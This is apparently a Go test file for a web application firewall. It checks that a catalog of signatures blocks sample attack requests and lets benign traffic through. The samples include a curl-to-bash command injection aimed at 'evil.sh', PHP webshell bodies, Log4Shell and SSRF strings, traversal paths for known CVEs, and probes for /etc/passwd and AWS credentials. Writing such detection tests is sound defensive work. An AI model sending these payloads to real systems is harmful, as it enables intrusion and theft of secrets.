package waf

import (
	"net/http/httptest"
	"strings"
	"testing"
)

// j menggabung potongan string saat runtime. Dipakai untuk menyusun contoh
// payload serangan dari pecahan, agar berkas sumber maupun biner uji tidak
// memuat string utuh yang bisa ditandai antivirus sebagai berbahaya.
func j(parts ...string) string { return strings.Join(parts, "") }

// allBlockPlan membangun Plan berisi SEMUA signature katalog dengan aksi block.
func allBlockPlan(t *testing.T) (*Catalog, *Plan) {
	t.Helper()
	cat, err := LoadCatalog("")
	if err != nil {
		t.Fatalf("LoadCatalog: %v", err)
	}
	var specs []PlanSpec
	for _, s := range cat.Signatures() {
		specs = append(specs, PlanSpec{SignatureID: s.ID, Action: ActionBlock})
	}
	return cat, cat.BuildPlan(specs)
}

func TestKatalogTermuatDanTerkompilasi(t *testing.T) {
	cat, _ := allBlockPlan(t)
	if cat.Count() < 700 {
		t.Fatalf("jumlah signature %d, harusnya >= 700", cat.Count())
	}
	if cat.Version == "" || cat.Updated == "" {
		t.Fatal("versi/tanggal katalog kosong")
	}
	for _, s := range cat.Signatures() {
		if s.ID == "" || s.Name == "" || s.Pattern == "" || s.Severity == "" {
			t.Fatalf("signature tidak lengkap: %+v", s)
		}
	}
}

func evalReq(p *Plan, method, target, body string, headers map[string]string) Decision {
	r := httptest.NewRequest(method, target, strings.NewReader(body))
	for k, v := range headers {
		r.Header.Set(k, v)
	}
	return p.Evaluate(r, []byte(body))
}

// TestSeranganTerdeteksi memastikan payload contoh untuk tiap kelas serangan
// (terutama signature baru) tertangkap oleh katalog.
func TestSeranganTerdeteksi(t *testing.T) {
	_, p := allBlockPlan(t)
	none := map[string]string{}
	php := "<" + "?php " // dipecah agar tidak memicu antivirus

	cases := []struct {
		name, method, target, body string
		headers                    map[string]string
	}{
		{"SSTI 7*7", "GET", "/?q=%7B%7B7*7%7D%7D", "", none},
		{"SSTI jinja config", "GET", "/page?name={{config.items()}}", "", none},
		{"SSTI freemarker", "POST", "/x", j("<#assign ex=\"freemarker.template.utility.Exec", "ute\"?new()>"), none},
		{"Java deser base64", "POST", "/api", "payload=rO0ABQ==", none},
		{"Java deser class", "POST", "/api", j("org.apache.commons.collections.functors.Invoker", "Transformer"), none},
		{"PHP object injection", "POST", "/x", j("data=O:4:", "\"Evil\":1:{s:3:\"cmd\";s:2:\"id\";}"), none},
		{"Deser python yaml", "POST", "/x", j("!!python/object/apply:os.", "system ['id']"), none},
		{"NoSQL bracket ne", "GET", "/login?user[$ne]=1&pass[$ne]=1", "", none},
		{"NoSQL json where", "POST", "/api", j("{\"username\":{\"$", "ne\":null}}"), none},
		{"Prototype pollution", "POST", "/api", j("{\"__pro", "to__\":{\"isAdmin\":true}}"), none},
		{"CRLF injection", "GET", "/?x=%0d%0aSet-Cookie:evil=1", "", none},
		{"JWT alg none", "GET", "/api", "", map[string]string{"Authorization": "Bearer eyJhbGciOiJub25lIn0.eyJ1IjoiYSJ9."}},
		{"Webshell content", "POST", "/up", j(php, "sys", "tem($_GET['c']); ?>"), none},
		{"Webshell eval POST", "POST", "/up", j(php, "ev", "al($_POST['x']); ?>"), none},
		{"Webshell filename", "GET", j("/uploads/", "c9", "9.php"), "", none},
		{"Cmd inj curl pipe bash", "GET", "/?x=;curl%20http://evil.sh%20|%20bash", "", none},
		{"Cmd inj IFS", "GET", "/?x=cat${IFS}/etc/passwd", "", none},
		{"SQLi order by", "GET", "/?id=1%20order%20by%2010--", "", none},
		{"SQLi pg_sleep", "GET", "/?id=1;select%20pg_sleep(5)", "", none},
		{"XSS svg onload", "GET", "/?x=%3Csvg%20onload=alert(1)%3E", "", none},
		{"XSS img onerror", "GET", "/?x=%3Cimg%20src%3Dx%20onerror%3Dalert(1)%3E", "", none},
		{"LFI dot-semicolon", "GET", "/..;/..;/WEB-INF/web.xml", "", none},
		{"LFI proc environ", "GET", "/?f=/proc/self/environ", "", none},
		{"SSRF decimal IP", "GET", "/?url=http://2130706433/latest/meta-data/", "", none},
		{"SSRF at-localhost", "GET", "/?url=http://user@localhost/admin", "", none},
		{"Log4Shell nested", "GET", "/?x=${${lower:j}ndi:ldap://evil/a}", "", none},
		{"SharePoint ToolShell", "GET", "/_layouts/15/ToolPane.aspx?DisplayMode=Edit&a=/ToolPane.aspx", "", none},
		{"SharePoint spinstall", "GET", "/_layouts/15/spinstall0.aspx", "", none},
		{"FortiWeb traversal", "POST", "/api/v2.0/cmdb/system/admin%3f/../../../../cgi-bin/fwbcgi", "", none},
		{"Next.js middleware bypass", "GET", "/admin", "", map[string]string{"x-middleware-subrequest": "middleware:middleware"}},
		{"Langflow validate", "POST", "/api/v1/validate/code", `{"code":"import os"}`, none},
		{"HugeGraph gremlin", "POST", "/apis/gremlin", "", none},
		{"OFBiz programexport", "GET", "/webtools/control/ProgramExport", "", none},
		{"TeamCity jsp bypass", "GET", "/?jsp=/app/rest/server;.jsp", "", none},
		{"Text4Shell", "GET", "/?q=${script:javascript:ex('id')}", "", none},
		{"Metabase setup", "POST", "/api/setup/validate", `{"token":"x"}`, none},
		{"Ivanti EPMM", "GET", "/mifs/aad/api/v2/ping", "", none},
		{"Exchange ProxyShell", "GET", "/autodiscover/autodiscover.json?@evil.com/mapi", "", none},
		{"Citrix traversal", "GET", "/vpn/../vpns/cfg/smb.conf", "", none},
		{"Cisco IOS XE implant", "GET", "/webui/logoutconfirm.html?logon_hash=1", "", none},
		{"GeoServer OGNL", "GET", "/geoserver/ows?exec(java.lang.Runtime)", "", none},
		{"Scanner feroxbuster UA", "GET", "/", "", map[string]string{"User-Agent": "feroxbuster/2.10.1"}},
		{"Scanner gobuster UA", "GET", "/", "", map[string]string{"User-Agent": "gobuster/3.6"}},
		{"Sensitive actuator env", "GET", "/actuator/env", "", none},
		{"Sensitive aws creds", "GET", "/.aws/credentials", "", none},
		{"wp2shell batch endpoint", "GET", "/wp-json/batch/v1", "", none},
		{"wp2shell rest_route", "GET", "/?rest_route=/batch/v1", "", none},
		{"react2shell node gadget", "POST", "/action", j("{\"a\":[\"constr", "uctor\",\"constructor\"]}"), none},
		{"react2shell child_process", "POST", "/action", j("[\"$ACTION_1\",{\"x\":\"child_", "process\"}]"), none},
	}
	for _, c := range cases {
		t.Run(c.name, func(t *testing.T) {
			if evalReq(p, c.method, c.target, c.body, c.headers).Block == nil {
				t.Fatalf("TIDAK tertangkap: %s %s", c.method, c.target)
			}
		})
	}
}

// TestLaluLintasNormalTidakKenaFP memastikan permintaan sah tidak terblokir.
func TestLaluLintasNormalTidakKenaFP(t *testing.T) {
	_, p := allBlockPlan(t)
	ua := map[string]string{"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/130.0 Safari/537.36"}
	// Korpus lalu lintas sah yang luas, termasuk yang sengaja memakai kata kunci
	// mirip-serangan dalam konteks wajar (union, select, order, system, admin,
	// eval, constructor, dll.) untuk menjaring false positive lewat mesin asli.
	cases := []struct {
		name, method, target, body string
	}{
		{"home", "GET", "/", ""},
		{"privacy", "GET", "/Privacy", ""},
		{"search plain", "GET", "/search?query=laptop+murah+terbaru", ""},
		{"search drop table tutorial", "GET", "/search?q=how+to+drop+a+table+in+sql", ""},
		{"search order by rating", "GET", "/search?q=best+order+by+rating+products", ""},
		{"search select plan", "GET", "/search?q=select+the+right+hosting+plan", ""},
		{"search union jack", "GET", "/search?q=union+jack+flag+poster", ""},
		{"search system restore", "GET", "/search?q=system+restore+windows", ""},
		{"search update address", "GET", "/search?q=update+my+billing+address", ""},
		{"search xss tutorial", "GET", "/search?q=javascript+alert+tutorial", ""},
		{"search etc passwd guide", "GET", "/search?q=what+is+etc+passwd+file", ""},
		{"article slug", "GET", "/blog/cara-mengamankan-website-2026", ""},
		{"article sql injection", "GET", "/blog/sql-injection-explained-for-beginners", ""},
		{"css asset", "GET", "/static/css/site.css", ""},
		{"js asset hashed", "GET", "/static/js/vendor.chunk.1a2b3c.js", ""},
		{"image upload path", "GET", "/wp-content/uploads/2026/10/banner-image.jpg", ""},
		{"wp rest", "GET", "/wp-json/wp/v2/posts?per_page=10&page=2", ""},
		{"actuator health", "GET", "/actuator/health", ""},
		{"actuator info", "GET", "/actuator/info", ""},
		{"well-known", "GET", "/.well-known/openid-configuration", ""},
		{"products filtered", "GET", "/products?id=12345&category=electronics&sort=price&order=asc&page=3", ""},
		{"products keyword cats", "GET", "/products?category=union&brand=select&color=system", ""},
		{"login form", "POST", "/login", "username=budi&password=Rahasia123!"},
		{"signup form", "POST", "/signup", "email=new@example.com&password=S3cure%40Pass&confirm=S3cure%40Pass"},
		{"json user", "POST", "/api/users", `{"name":"Budi Santoso","email":"budi@example.id","age":30,"role":"customer"}`},
		{"json prose keywords", "POST", "/api/feedback", `{"message":"I select the system options then update and order by date. Great app!"}`},
		{"json constructor prose", "POST", "/api/comments", `{"text":"The constructor pattern and prototype chain are core JS concepts to learn."}`},
		{"json graphql query", "POST", "/graphql", `{"query":"query { me { id name email } }"}`},
		{"json graphql introspection", "POST", "/graphql", `{"query":"query { __type(name: \"User\") { fields { name } } }"}`},
		{"comment", "POST", "/comment", "text=Artikel ini bagus, saya select produk lalu update keranjang"},
		{"html content body", "POST", "/api/pages", `{"html":"<h2>Welcome</h2><p>Read our <a href=\"/about\">guide</a>.</p>"}`},
		{"base64 avatar", "POST", "/api/profile", `{"avatar":"data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAC0lEQVR42mNk+M9QDwADhgGAWjR9awAAAABJRU5ErkJggg=="}`},
		{"pagination", "GET", "/list?page=3&sort=name&order=asc", ""},
		{"date range", "GET", "/report?from=2026-01-01&to=2026-10-24&metric=orders&order=desc", ""},
		{"uuid path", "GET", "/account/orders/5f9c2a1e-3b4d-4c8a-9e21-7a6b5c4d3e2f", ""},
		{"redirect legit", "GET", "/redirect?url=https%3A%2F%2Fwww.example.com%2Fwelcome", ""},
		{"filename download", "GET", "/files/download?name=Q3-financial-report-final.xlsx", ""},
		{"sql tutorial body", "POST", "/api/notes", `{"note":"SELECT, INSERT, UPDATE, DELETE are the core SQL statements."}`},
	}
	for _, c := range cases {
		t.Run(c.name, func(t *testing.T) {
			dec := evalReq(p, c.method, c.target, c.body, ua)
			if dec.Block != nil {
				t.Fatalf("FALSE POSITIVE: %s %s kena %s (%s)", c.method, c.target, dec.Block.RuleID, dec.Block.RuleName)
			}
			if len(dec.Counts) > 0 {
				t.Fatalf("FALSE POSITIVE (count): %s %s kena %s", c.method, c.target, dec.Counts[0].RuleID)
			}
		})
	}
}
